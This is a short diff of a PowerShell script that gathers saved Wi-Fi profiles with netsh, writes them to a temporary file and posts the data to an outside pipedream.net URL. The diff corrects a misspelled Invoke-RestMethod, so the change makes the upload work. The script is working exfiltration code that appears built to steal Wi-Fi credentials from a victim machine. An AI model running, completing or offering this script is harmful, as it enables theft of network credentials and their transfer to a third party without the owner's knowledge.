@@ -2,4 +2,4 @@ $wifi=(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.
 $url="https://eox19ny634t6muh.m.pipedream.net"
 $wifi | Out-File tmp.txt
 $data=Get-Content ./tmp.txt
-Invoke-ResstMethod -Method Post -Uri $url -Body $data
+Invoke-RestMethod -Method Post -Uri $url -Body $data
